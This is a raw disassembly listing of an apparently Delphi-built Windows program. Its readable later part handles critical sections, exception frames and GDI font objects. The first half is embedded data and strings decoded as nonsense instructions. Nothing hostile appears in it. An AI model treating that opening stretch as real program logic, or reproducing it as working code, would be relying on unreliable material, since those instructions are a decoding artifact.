bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
dec esi
outsd
je r-xdata
dec esi
outsd
pop es
jo r-xdata
popad
jae r-xdata
jo r-xdata
inc esp
popad
jae r-xdata
or al 0x70
inc ebx
insb
popad
jb r-xdata
jo r-xdata
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
rol [ ecx ] 0x8b
shl [ eax ] 0xc1
inc ecx
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
je r-xdata
push ebx
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add ah al
rol [ ecx ] 0x6
jae r-xdata
insb
or [ fs : esi + 0x73 ] ah
je r-xdata
add [ ecx ] al
add ch bh
jae r-xdata
jae r-xdata
popad
jae r-xdata
push es
jo r-xdata
je r-xdata
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
outsd
je r-xdata
pop eax
dec esi
jo r-xdata
inc esp
outsd
push ebx
je r-xdata
push eax
or [ edi + 0x72 ] al
jo r-xdata
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
imul eax [ edi ] 0x70
insd
outsd
imul esp [ ebx + 0x73 ] 0xc118c08b
inc ecx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ ecx + eax * 8 ] ch
inc ecx
add [ edi ] al
jo r-xdata
outsd
push es
jo r-xdata
jb r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
pop es
jo r-xdata
aad 0x41
add [ edi ] cl
push esp
inc edi
jb r-xdata
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
jae r-xdata
outsd
jb r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
insb
add eax 0x6f586d70
jb r-xdata
inc ebx
outsd
jo r-xdata
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
outsd
je r-xdata
pop es
jb r-xdata
insd
outsd
jo r-xdata
mov eax eax
push esp
retn 0x41
inc edi
jb r-xdata
add [ eax ] al
add [ eax ] al
inc eax
retn
bound esi [ ebx + 0x53 ]
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
imul esp [ ebx + 0x73 ] 0x41c19890
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
outsb
dec esi
outsd
je r-xdata
dec ecx
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x3d ] al
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + eax * 8 ] ah
inc ecx
jae r-xdata
rcl [ edx + eax * 8 + 0x41 ] 0x0
add ecx [ ebx ]
push esp
inc edx
jb r-xdata
push 0x8b736369
push eax
outsb
dec esi
outsd
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
jo r-xdata
add eax 0x6f4e6d70
inc esp
popad
jae r-xdata
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
popad
jb r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
jo r-xdata
nop
inc edi
sbb bl al
inc ecx
add [ eax ] bl
add [ eax ] al
add al bh
sbb eax [ ecx ]
les esi [ eax + eax * 2 ]
jpe r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0xc254c08b
inc ecx
or [ eax + 0x6d ] esi
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
push es
jo r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
outsd
outsb
jo r-xdata
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax - 0x3e ] dl
inc ecx
add [ edi ] al
dec ebp
jb r-xdata
insd
inc esi
jb r-xdata
jb r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
dec ebp
push eax
outsb
insb
add eax 0x6f4e6d70
je r-xdata
add eax 0x6f447370
je r-xdata
or esp [ gs : esi + 0x73 ]
push ebx
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0x41c09c90
add [ edx ] cl
or [ esi + eax * 2 + 0x6f ] edx
dec ecx
je r-xdata
jo r-xdata
popad
bound ebp [ ebp + 0x7 ]
add [ eax ] al
push 0x200041c3
add [ eax ] al
add [ ecx ] al
add ch bh
jmp [ eax - 0x28 ]
imul esp [ ebx + 0x73 ] 0xffff0001
nop
in al dx
retn
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + eax * 2 - 0x3d ] si
inc ecx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
[ eax ]
jo r-xdata
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
inc ecx
add ah al
xor al 0x40
outsb
je r-xdata
outsd
popad
insb
dec esi
outsd
je r-xdata
inc ecx
add [ gs : eax ] eax
add [ eax ] al
push 0x6c797453
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + 0x47 ] al
inc ecx
add [ eax + 0x48 ] dl
inc ecx
add [ eax + 0x48 ] bl
inc ecx
add [ edi + eax * 2 + 0x41 ] ch
inc eax
inc esp
imul esp [ ebx + 0x61 ] 0x73620b6c
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
outsb
pop es
jo r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
je r-xdata
popad
jo r-xdata
insd
or [ gs : edi + 0x72 ] al
dec ebp
popad
jae r-xdata
sbb al 0xc4
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] cl
les eax [ ecx ]
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + ebx - 0x3d ] si
inc ecx
add [ esp + ebx + 0x41 ] ch
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
popad
imul esp [ ebx + 0x73 ] 0x41c31890
add [ ebx + eax * 8 ] ch
insb
dec ebp
jb r-xdata
add [ ebx ] al
outsb
adc al ah
inc ecx
add [ eax + eax ] ah
add [ eax ] al
int3
jo r-xdata
dec esi
outsd
or dh [ gs : eax + 0x6d ]
retn 0x41
imul esp [ ebx + 0x73 ] 0xc08b0000
insb
retn
sub_41c3ae
inc ecx
add [ esp + eax * 8 ] bl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] cl
les eax [ ecx ]
adc al ah
inc ecx
add [ eax + eax ] ah
add [ eax ] al
int3
sub_41c520
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ch 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + eax * 8 + 0x41 ] dh
add [ eax + eax ] bl
add [ eax ] al
int3
sub_41c548
les esi [ eax + eax * 2 ]
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ebp + ebx * 8 + 0x41 ] dl
add [ eax + 0x48 ] dl
inc ecx
add [ eax + 0x48 ] bl
inc ecx
add [ ebp + ebx * 8 + 0x41 ] bh
add [ esp + edx * 2 ] al
push eax
outsb
lea eax [ eax ]
add ch 0x41
add [ edi ] al
add al 0x54
push eax
outsb
push 0x3c0041c5
retn
sub_41c58c
inc ecx
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
test al 0xdf
inc ecx
add [ eax + 0x10041df ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74646957
push 0xc668c08b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x41c6 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + eax * 8 + 0x41 ] dh
add [ eax ] bl
add [ eax ] al
add ah cl
retn 0x41
imul esp [ ebx + 0x73 ] 0xbf780004
inc ecx
add [ esi + ebx * 8 - 0x215bffbf ] bl
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
aam 0x34
inc eax
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ebp + ebx * 8 + 0x41 ] dl
add [ eax + 0x48 ] dl
inc ecx
add [ eax + 0x48 ] bl
inc ecx
add [ ebp + ebx * 8 + 0x41 ] bh
add [ esp + edx * 2 ] al
push eax
outsb
lea eax [ eax ]
add ch 0x41
add [ edi ] al
add al 0x54
push eax
outsb
push 0x3c0041c5
retn
rol [ ecx ] 0x18
add [ eax ] al
jmp [ edi + ebx * 8 + 0x41 ]
sub_41c868
inc edx
enter 0x41 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx * 8 ] ch
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx * 8 ] dl
inc ecx
add [ ecx + ecx * 8 ] bl
inc ecx
add [ eax ] ch
add [ eax ] al
add al ch
sbb al 0x41
add ah al
xor al 0x40
add [ eax ] dl
dec ecx
inc ecx
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + 0x47 ] al
inc ecx
add [ eax + 0x48 ] dl
inc ecx
add [ eax ] al
inc [ ecx ]
insb
inc edi
inc ecx
add [ eax - 0x6fffbeb7 ] ah
inc [ ecx ]
nop
sub al [ eax ]
dec esp
inc [ ecx ]
nop
sub al [ eax ]
nop
sub al [ eax ]
xchg esp eax
add [ edx ] al
cwde
add [ edx ] al
nop
sub al [ eax ]
sbb [ ecx ] al
inc edx
add [ eax + 0x7c00402a ] dl
add [ edx ] eax
add [ ecx ] 0x42
add [ eax - 0x6fffbfd6 ] dl
add [ edx ] eax
pop eax
inc [ ecx ]
pushfd
add [ edx ] al
and al 0x1
inc edx
add [ eax - 0x6fffbfd6 ] dl
sub al [ eax ]
nop
sub al [ eax ]
nop
sub al [ eax ]
add [ eax ] eax
std
push eax
add [ edx ] al
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x2a900040 ] al
inc eax
add [ esp + edx * 2 ] cl
imul esp [ ebx - 0x73 ] 0xc92c0040
inc ecx
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
push ebx
push 0x64657261
dec ecx
insd
popad
lea eax [ bx + si ]
clc
leave
or al 0x54
imul esp [ ebx - 0x50 ] 0x6c0041c8
sbb eax 0x41
or [ edi + 0x72 ] al
popad
jo r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
leave
inc ecx
add [ eax + eax ] dh
add [ ecx + ecx * 8 + 0x41 ] cl
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + 0x5 ] bh
inc edx
add ah dl
add eax 0x540c0042
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
lea eax [ bx + si ]
pop eax
0x41
imul esp [ ebx + 0x73 ] 0x98900000
leave
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx * 8 + 0x80041 ] bl
add [ eax ] al
mov eax 0xc4004010
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
sub_41ca10
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0xca
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
0x41
sub_41ca30
cmp al 0x0
add [ eax ] al
enter 0x41 0xc4
xor al 0x40
add [ eax ] dl
dec ecx
inc ecx
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + edx + 0x42 ] ah
add [ eax + 0x48 ] dl
inc ecx
add [ eax ] al
inc [ ecx ]
mov al [ 0xffffffffa0004210 ]
dec ecx
inc ecx
add [ edx + edx + 0x42 ] dh
add ah dh
adc al [ edx ]
dec esp
inc [ ecx ]
test al 0x15
inc edx
add [ esi + edx + 0x42 ] bl
add [ esi + edx + 0x980042 ] bl
inc edx
add al bh
push ss
inc edx
add ah ah
sbb al [ edx ]
loopne r-xdata
pushfd
daa
inc edx
add [ ecx + ebx ] bh
inc edx
add [ edi + 0x160c0042 ] ah
inc edx
add [ esi + edx + 0x42 ] ch
add [ eax + 0x7004221 ] ch
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41cad470
add [ edi ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41ca5870
add [ eax ] ch
leave
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
inc edx
add [ ebx + 0x1800042 ] dh
inc edx
add [ eax - 0x23ffbddc ] cl
and al 0x42
add ah bh
cmovb eax [ eax ]
pushfd
add [ edx ] al
and al 0x1
inc edx
add al al
sbb [ edx ] eax
popad
nop
pushfd

jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx * 8 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
imul esp [ ebx + 0x73 ] 0xc08b0000
inc eax

sub_41caf8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp

sub_41cb54
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0xcc
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_41cc3c
mov ah cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x240041cc ] cl
add [ eax ] al
add [ eax - 0x3bffbff0 ] bh
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add ah ch
int3
sub_41ccb0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_41ccec
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_41cd28
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_41cc9c
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_41cd10
xor edx edx
push ebp
push sub_41cdfc
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ce03
mov eax [ ebp - 0x4 ]
call sub_41cd1c
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_4026e4
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_4028e0
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_407ca0
test al al
je r-xdata
sub_41ce0c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_41cd10
xor ecx ecx
push ebp
push sub_41ce93
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cd1c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_41cebc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41cd10
xor eax eax
push ebp
push sub_41cf25
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41cd28
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41ce0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cf2c
mov eax [ ebp - 0x4 ]
call sub_41cd1c
retn
mov eax ebx
mov si 0xfffd
call sub_403490
sub_41cf34
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41cd10
xor eax eax
push ebp
push sub_41cf90
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cf97
mov eax [ ebp - 0x4 ]
call sub_41cd1c
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_403490
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41ce0c
sub_41cfa0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41cd10
xor edx edx
push ebp
push sub_41cfff
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d006
mov eax [ ebp - 0x4 ]
call sub_41cd1c
retn
mov esi ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_41d00c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_414534
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41d0a9
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_414170
mov ebx eax
mov eax ebx
call sub_41e5d8
inc [ ebp - 0x4 ]
mov eax ebx
call sub_41e924
mov eax [ rw-data ]
call sub_41cfa0
mov eax [ rw-data ]
call sub_41cfa0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d0b0
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_414598
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_414170
call sub_41e7fc
inc esi
dec ebx
jne r-xdata
sub_41d6ff
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_413c20
retn
sub_41d730
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x4
mov al [ esp + 0x17 ]
mov [ ebx + 0xa ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_402da4
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xb ]
mov cl 0x1f
call sub_402b94
mov al [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0x9 ] 0x8
mov [ ebx + 0x8 ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_41d7e4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41cd28
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_41d838
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41ce0c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_41d87c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41476c
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41d53c
xor eax eax
push ebp
push sub_41d937
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41d53c
xor eax eax
push ebp
push sub_41d91a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41cf34
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41d9b8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d921
mov eax [ ebp - 0x8 ]
call sub_41d54c
retn
mov eax ebx
call sub_41dc3c
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41dc58
sub_41d968
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41d53c
xor eax eax
push ebp
push sub_41d9ad
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41cebc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d9b4
mov eax [ ebp - 0x4 ]
call sub_41d54c
retn
sub_41d9cc
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
xor edx edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41db55
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41db5c
lea eax [ ebp - 0x4c ]
mov edx 0x3
call sub_404074
retn
mov eax [ rw-data ]
call sub_41cd10
xor eax eax
push ebp
push sub_41db2d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41cd1c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_4042b4
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_4086cc
lea eax [ ebp - 0x48 ]
mov edx rw-data
call sub_4042b4
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x24 ]
call sub_4086cc
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x8
setne al
mov [ ebp - 0x2a ] al
